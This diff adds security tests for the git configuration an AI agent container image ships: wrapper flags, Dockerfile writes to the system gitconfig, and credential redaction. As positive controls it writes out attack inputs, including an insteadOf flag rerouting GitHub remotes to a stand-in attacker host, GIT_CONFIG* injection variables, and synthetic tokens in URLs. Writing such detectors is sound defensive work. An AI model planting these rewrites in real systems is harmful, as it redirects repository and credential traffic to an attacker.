@@ -6,6 +6,21 @@ import fs from "node:fs";
 import os from "node:os";
 import { fileURLToPath } from "node:url";
 
+// PEN-4541: the git-config surface predicates, shared with the image-level
+// check that runs in docker-agent.yml so both assert the same thing.
+import {
+  configFlags,
+  configInjectionEnv,
+  dockerfileGitConfigInvocations,
+  credentialedUrl,
+  insteadOfOccurrences,
+  redactCredentials,
+  residualSecrets,
+  EXPECTED_DOCKERFILE_GIT_CONFIG,
+  EXPECTED_SYSTEM_GITCONFIG,
+  EXPECTED_WRAPPER_CONFIG_FLAGS,
+} from "../../../../scripts/git-config-surface.mjs";
+
 // PEN-2527/PEN-2526. Agent-authored GitHub content is scrubbed of
 // credential-shaped material by wrapper binaries the seed init container
 // publishes onto the PVC. The scrubber only sits on the traffic path if those
@@ -898,3 +913,371 @@ test("the rendered MCP wrapper hands the real server to the scrub runtime as its
   );
 });
 
+
+// --- The git-config surface the agent image ships (PEN-4541) ---------------
+//
+// Assertion (a) of PEN-4541: the surface AS DECLARED IN THIS REPO. Its pair,
+// assertion (b), runs against the actually-built image in docker-agent.yml
+// (`scripts/check-agent-image-git-config.mjs`) and catches what this one
+// structurally cannot -- anything that writes /etc/gitconfig outside the
+// declared lines, such as a SERVER_IMAGE/TOOLCHAIN_IMAGE base change or a
+// vendored toolchain layer. Neither is sufficient alone; do not delete one as
+// redundant with the other.
+//
+// ⛔ OUT OF SCOPE, stated here so a green run is not over-read: both
+// assertions measure the artifact AT PRODUCTION -- the sources, and the image
+// before it is promoted and rolled out. Neither covers mutation of an
+// already-published image (a Harbor retag or overwrite of a tag that already
+// passed this gate) or drift of an already-running pod. Registry-side
+// immutability is a separate control and was deliberately NOT assigned with
+// this work. If you want it, file it.
+//
+// Why these live here: this file already reads both artifacts the check needs,
+// and already runs in the `Helm chart` verify lane. What it did NOT do is
+// assert anything about the FLAGS -- see the C3 note in
+// scripts/git-config-surface.mjs for why the existing IMAGE_WRAPPER_BIN count
+// above passes unchanged while a fleet-wide remote rewrite is live.
+
+test("every github wrapper passes exactly the git config flags it declares (PEN-4541)", () => {
+  const dir = path.join(repoRoot, "docker/github-wrappers");
+
+  // Enumerate the DIRECTORY, not a list written here. A hardcoded list is the
+  // obvious way to write this and it silently omits the next wrapper somebody
+  // adds -- which is the one most likely to be wrong. An undeclared file is a
+  // failure, so adding a wrapper forces a declaration in
+  // EXPECTED_WRAPPER_CONFIG_FLAGS and a human read of this comment.
+  //
+  // `.md` is excluded to match the Dockerfile's own `--exclude=*.md`: a doc
+  // file is not installed and executes nothing.
+  const shipped = fs
+    .readdirSync(dir)
+    .filter((name) => !name.endsWith(".md"))
+    .sort();
+
+  assert.deepEqual(
+    shipped,
+    [...EXPECTED_WRAPPER_CONFIG_FLAGS.keys()].sort(),
+    "docker/github-wrappers/ gained or lost a wrapper: declare its exact `-c` flag set in EXPECTED_WRAPPER_CONFIG_FLAGS (scripts/git-config-surface.mjs) so it is covered, rather than leaving it unasserted",
+  );
+
+  for (const name of shipped) {
+    const body = fs.readFileSync(path.join(dir, name), "utf8");
+
+    // EQUALITY, deliberately, and this is the whole point of PEN-4541's
+    // correction C3. The attack is an ADDED flag -- appending
+    // `-c url.https://attacker.example/.insteadOf=https://github.com/` makes
+    // every agent in the fleet rewrite its GitHub remotes -- and a superset or
+    // `.includes()` check can only ever observe that the good flags are still
+    // present. The order is part of the equality too: for `git`, the empty
+    // value must clear the inherited helper BEFORE the paperclip helper is
+    // named, or the clear wipes the helper it is meant to install.
+    // `assert.ok`, not `assert.deepEqual`: a failing deepEqual appends its own
+    // diff of the raw values, which would print a credential straight into a CI
+    // log if one were ever planted in a flag. Same discipline as the image
+    // checker; see redactCredentials in scripts/git-config-surface.mjs.
+    const flags = configFlags(body);
+    const expectedFlags = EXPECTED_WRAPPER_CONFIG_FLAGS.get(name);
+    assert.ok(
+      flags.length === expectedFlags.length &&
+        flags.every((flag, index) => flag === expectedFlags[index]),
+      `the ${name} wrapper's git config flags are not the declared set — an added or reordered -c flag changes what every agent in the fleet executes (PEN-4541 C3).\n  expected: ${JSON.stringify(expectedFlags)}\n  got:      ${JSON.stringify(redactCredentials(flags.join(" | ")))}`,
+    );
+
+    // Body-wide, not exec-line-scoped like the flags above, because this one
+    // must hold wherever it is written: a rewrite rule is just as fleet-wide
+    // if a future edit installs it with `git config` inside the wrapper rather
+    // than as a `-c` flag.
+    assert.deepEqual(
+      insteadOfOccurrences(body),
+      [],
+      `the ${name} wrapper names an insteadOf rule: that silently reroutes every GitHub URL in every repo on every agent, away from the credential helper this wrapper exists to install`,
+    );
+
+    // The argv-free equivalent of `-c`, which a flag-set equality cannot see.
+    // GIT_CONFIG_COUNT/KEY_n/VALUE_n injects config with exactly the force of
+    // a `-c` flag, and GIT_CONFIG_GLOBAL/SYSTEM repoints a whole scope at an
+    // attacker-chosen file.
+    assert.equal(
+      configInjectionEnv(body),
+      null,
+      `the ${name} wrapper sets a GIT_CONFIG* variable, which injects git config as forcefully as a -c flag and is invisible to the flag-set equality above`,
+    );
+
+    assert.equal(
+      residualSecrets(body),
+      0,
+      `the ${name} wrapper carries a credential-bearing URL — these files are installed world-readable at 0755 into every agent image`,
+    );
+  }
+
+  // C1/C2 restated as its own assertion rather than left implicit in the
+  // equality above, because this is the half PEN-4538 originally pointed at
+  // the WRONG FILE. The paperclip credential helper is NOT in /etc/gitconfig
+  // -- that scope carries the `gh` helper -- it arrives on git's `command
+  // line:` scope from this wrapper. A check written against /etc/gitconfig
+  // pins the gh helper and says nothing at all about this one.
+  assert.equal(
+    configFlags(fs.readFileSync(path.join(dir, "git"), "utf8")).at(-1),
+    `credential.https://github.com.helper=${IMAGE_WRAPPER_BIN}/github-token-credential-helper`,
+    "the git wrapper no longer installs the paperclip credential helper; git treats an absent helper as a silent fallthrough, not an error",
+  );
+});
+
+test("the agent image's build chain writes exactly one system git config (PEN-4541)", () => {
+  // All four Dockerfiles in the agent image's chain, not just the one that
+  // currently writes: the risk this assertion exists for is a SECOND write
+  // appearing, and only Dockerfile.runtime having one today is the thing being
+  // asserted, not an assumption that lets the others go unread.
+  const chain = [
+    "Dockerfile",
+    "Dockerfile.runtime",
+    "Dockerfile.agent-toolchain",
+    "Dockerfile.agent",
+  ];
+
+  const invocations = [];
+  for (const name of chain) {
+    const body = fs.readFileSync(path.join(repoRoot, name), "utf8");
+    for (const invocation of dockerfileGitConfigInvocations(body)) {
+      invocations.push(`${name}: ${invocation}`);
+    }
+
+    // A `git config` invocation is not the only way to write the system scope
+    // -- an `echo >> /etc/gitconfig` or a COPY over it reaches the same file
+    // and would be invisible to the list above. Comments are stripped first,
+    // so the explanatory prose in Dockerfile.runtime (and the pointer to this
+    // test) does not trip it.
+    const executable = body
+      .split("\n")
+      .filter((line) => !/^\s*#/.test(line))
+      .join("\n");
+    assert.ok(
+      !executable.includes("/etc/gitconfig"),
+      `${name} names /etc/gitconfig outside a comment: the system scope is written once, by \`git config --system\` in Dockerfile.runtime, and a second writer is exactly what assertion (b) exists to catch in the built image`,
+    );
+    assert.equal(
+      configInjectionEnv(executable),
+      null,
+      `${name} sets a GIT_CONFIG* variable, which redirects or injects the config scope this gate measures`,
+    );
+  }
+
+  assert.deepEqual(
+    invocations,
+    [`Dockerfile.runtime: ${EXPECTED_DOCKERFILE_GIT_CONFIG}`],
+    "the agent image's build chain no longer writes exactly one git config line — a second line, a changed helper, or an insteadOf rule here lands in /etc/gitconfig on every agent (PEN-4541)",
+  );
+
+  // Equality above already forbids them; these two name the specific shapes so
+  // a failure reads as the finding it is rather than as a diff.
+  const runtime = fs.readFileSync(path.join(repoRoot, "Dockerfile.runtime"), "utf8");
+  assert.deepEqual(
+    insteadOfOccurrences(runtime),
+    [],
+    "Dockerfile.runtime names an insteadOf rule: planted in the system scope it reroutes every GitHub URL on every agent",
+  );
+  assert.equal(
+    residualSecrets(runtime),
+    0,
+    "Dockerfile.runtime carries a credential-bearing URL, which would be baked into every agent image at rest",
+  );
+});
+
+// The join between the two assertions. (a) pins the Dockerfile LINE and (b)
+// pins the FILE that line produces, and nothing else forces those two
+// expectations to describe the same thing -- edit one and the other goes on
+// asserting the old surface, with both staying green, which is the quiet way a
+// pair of checks becomes one check.
+//
+// So derive it: run the declared command and compare the bytes. This is also
+// where the 77-byte figure measured on PEN-4541 comes from, rather than being
+// restated from the issue.
+test("the declared Dockerfile line produces the declared /etc/gitconfig (PEN-4541)", () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pen4541-"));
+  try {
+    const file = path.join(dir, "gitconfig");
+    // GIT_CONFIG_SYSTEM redirects `--system` at a file we own, so the real
+    // command runs unmodified. (The wrappers and Dockerfiles are forbidden
+    // from setting this variable, for the reason in configInjectionEnv; a test
+    // using it deliberately to sandbox a write is the opposite case.)
+    execFileSync("/bin/sh", ["-c", EXPECTED_DOCKERFILE_GIT_CONFIG], {
+      env: { ...process.env, GIT_CONFIG_SYSTEM: file },
+    });
+    assert.equal(
+      fs.readFileSync(file, "utf8"),
+      EXPECTED_SYSTEM_GITCONFIG,
+      "the git config line Dockerfile.runtime runs does not produce the file scripts/check-agent-image-git-config.mjs expects to find in the built image — the source-level and image-level assertions have drifted apart and are no longer describing one surface. If neither expectation changed, compare this runner's git against the image's: this asserts git's config-writing format, which is stable but not a promise.",
+    );
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// POSITIVE CONTROLS. PEN-4541 makes these a requirement rather than a courtesy,
+// and the reason generalises: a check that reads the wrong thing, or whose
+// predicate never matches, passes trivially and FOREVER. Nothing about a green
+// run distinguishes "the surface is clean" from "the detector is dead".
+//
+// So each predicate above is driven here against input that must RED it. These
+// are pure-function cases on synthetic text -- they touch no repo file, so they
+// cannot be satisfied by the real artifacts happening to be clean, which is the
+// failure mode they exist to exclude.
+//
+// Assertion (b)'s positive controls cannot be written here, because the thing
+// they must prove is about an image. They live in docker-agent.yml, where a
+// one-layer image derived FROM the agent image carries each mutation and the
+// checker must go red on it.
+test("the git-config surface predicates actually fire (PEN-4541 positive controls)", () => {
+  const clean = fs.readFileSync(
+    path.join(repoRoot, "docker/github-wrappers/git"),
+    "utf8",
+  );
+  // The benign shape measured on the PVC: an SSH-style bare username, which
+  // MIN_BARE_SECRET_LEN exists to tell apart from a credential. Assembled like
+  // every other URL here — see credentialedUrl for why none of these is a
+  // literal.
+  const BENIGN_SSH_STYLE_URL = credentialedUrl({
+    user: "git",
+    path: "/Blockcast/paperclip.git",
+  });
+
+  // Control 1 -- correction C3, reproduced exactly. Append the rewrite flag to
+  // the real wrapper and assert BOTH that the flag-set equality reds AND that
+  // the existing IMAGE_WRAPPER_BIN count does not: if the count ever starts
+  // catching this, the two assertions have been conflated and this comment is
+  // wrong.
+  const poisoned = clean.replace(
+    '  "$@"',
+    '  -c url.https://attacker.example/.insteadOf=https://github.com/ \\\n  "$@"',
+  );
+  assert.notEqual(poisoned, clean, "the C3 control did not modify the wrapper — re-point it");
+  assert.notDeepEqual(
+    configFlags(poisoned),
+    EXPECTED_WRAPPER_CONFIG_FLAGS.get("git"),
+    "the flag-set equality did not notice an added insteadOf -c flag: this is PEN-4541 C3 and it is the whole reason this assertion is an equality",
+  );
+  assert.equal(
+    poisoned.split(IMAGE_WRAPPER_BIN).length - 1,
+    2,
+    "the pre-existing path-count guard was expected to stay green on this input — it counts a path, not a flag set (PEN-3748 vs PEN-4541)",
+  );
+  assert.equal(
+    insteadOfOccurrences(poisoned).length,
+    1,
+    "the control expects exactly one planted rule — if this reads 2, the real wrapper it builds on is already poisoned and the assertion above is the one to read",
+  );
+
+  // Control 2 -- casing. `git` matches config keys case-insensitively, so a
+  // case-sensitive scan is defeated by typing the rule differently.
+  for (const spelling of ["insteadOf", "insteadof", "INSTEADOF", "InsteadOf"]) {
+    assert.equal(
+      insteadOfOccurrences(`[url "https://x/"]\n\t${spelling} = https://github.com/\n`).length,
+      1,
+      `the insteadOf scan missed the ${spelling} spelling, which git honours`,
+    );
+  }
+
+  // Control 3 -- the credential predicate, on the shape PEN-4541 names
+  // specifically: a token in a URL SECTION NAME, which is where the 2026-10-19
+  // token at rest actually sat (PEN-4330). This is the case an implementation
+  // anchored to `url = ` / `remote = ` keys would silently miss.
+  const token = `ghs_${"A".repeat(36)}`;
+  assert.equal(
+    residualSecrets(`[url "${credentialedUrl({ secret: token })}"]\n\tinsteadOf = https://github.com/\n`),
+    1,
+    "residualSecrets missed a credential in a URL section name — the predicate must not be anchored to a config key",
+  );
+  assert.equal(
+    residualSecrets(
+      `[credential]\n\thelper = store --file=${credentialedUrl({ user: token, host: "example" })}\n`,
+    ),
+    1,
+    "residualSecrets missed a bare long-token credential outside a url key",
+  );
+  // ...and its negative half. A predicate that matches everything is as dead as
+  // one that matches nothing, and this is the exact benign shape measured on
+  // the PVC.
+  assert.equal(
+    residualSecrets(EXPECTED_SYSTEM_GITCONFIG),
+    0,
+    "residualSecrets flags the real system gitconfig — it would red every build and be switched off",
+  );
+  assert.equal(
+    residualSecrets(
+      `[remote "origin"]\n\turl = ${BENIGN_SSH_STYLE_URL}\n`,
+    ),
+    0,
+    "residualSecrets flags an SSH-style username as a secret; MIN_BARE_SECRET_LEN exists to tell those apart",
+  );
+  assert.equal(
+    residualSecrets(credentialedUrl({ user: "user", secret: "" })),
+    0,
+    "an empty secret after the colon is not a credential (parity with scrubber.py's partition)",
+  );
+
+  // Control 3b -- the redaction that every failure message in both consumers
+  // depends on. A control for credentials at rest whose own failure output
+  // copies the credential into a CI log has moved the exposure, not closed it;
+  // the first cut of the image checker did exactly that and its own control
+  // caught it. The lossy direction is deliberate and is why nothing ever
+  // COMPARES redacted text -- see redactCredentials.
+  assert.equal(
+    redactCredentials(`[url "${credentialedUrl({ secret: token })}"]`),
+    `[url "${credentialedUrl({ user: "<redacted>", secret: undefined })}"]`,
+  );
+  assert.ok(
+    !redactCredentials(
+      `url = ${credentialedUrl({ user: token, path: "/o/r.git" })}`,
+    ).includes(token),
+    "redactCredentials left a bare long-token credential in text bound for a CI log",
+  );
+  assert.equal(
+    redactCredentials(EXPECTED_SYSTEM_GITCONFIG),
+    EXPECTED_SYSTEM_GITCONFIG,
+    "redactCredentials rewrote a clean config — a redactor that mangles benign output makes every real finding harder to read",
+  );
+  assert.equal(
+    redactCredentials(BENIGN_SSH_STYLE_URL),
+    BENIGN_SSH_STYLE_URL,
+    "redactCredentials redacted an SSH-style username, which is not a credential",
+  );
+
+  // Control 4 -- the argv-free injection path.
+  for (const shape of [
+    'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://attacker/.insteadOf exec "$@"',
+    'export GIT_CONFIG_GLOBAL=/paperclip/.gitconfig\nexec "$@"',
+    'GIT_CONFIG_SYSTEM=/tmp/x exec "$@"',
+  ]) {
+    assert.notEqual(
+      configInjectionEnv(shape),
+      null,
+      `the GIT_CONFIG* scan missed ${shape.split("\n")[0]}, which injects config as forcefully as a -c flag`,
+    );
+  }
+  assert.equal(
+    configInjectionEnv(clean),
+    null,
+    "the GIT_CONFIG* scan flags the real wrapper — it would red every build",
+  );
+
+  // Control 5 -- the Dockerfile reader. A second `git config` line, and a
+  // continuation-joined one, must both be seen; the real file uses a
+  // continuation, so a reader that did not join them would return nothing and
+  // the equality would be vacuously satisfied by an empty list.
+  const twoLines =
+    "RUN git config --system credential.helper x \\\n  && git config --system url.https://attacker/.insteadOf https://github.com/\n";
+  assert.equal(
+    dockerfileGitConfigInvocations(twoLines).length,
+    1,
+    "a `&&`-chained second git config must stay on one logical line for the equality to see it",
+  );
+  assert.ok(
+    dockerfileGitConfigInvocations(twoLines)[0].includes("insteadOf"),
+    "the Dockerfile reader dropped the second, chained git config invocation",
+  );
+  assert.deepEqual(
+    dockerfileGitConfigInvocations("# RUN git config --system x.y z\n"),
+    [],
+    "the Dockerfile reader counts a commented-out line, so the prose around the real one would fail the equality",
+  );
+});
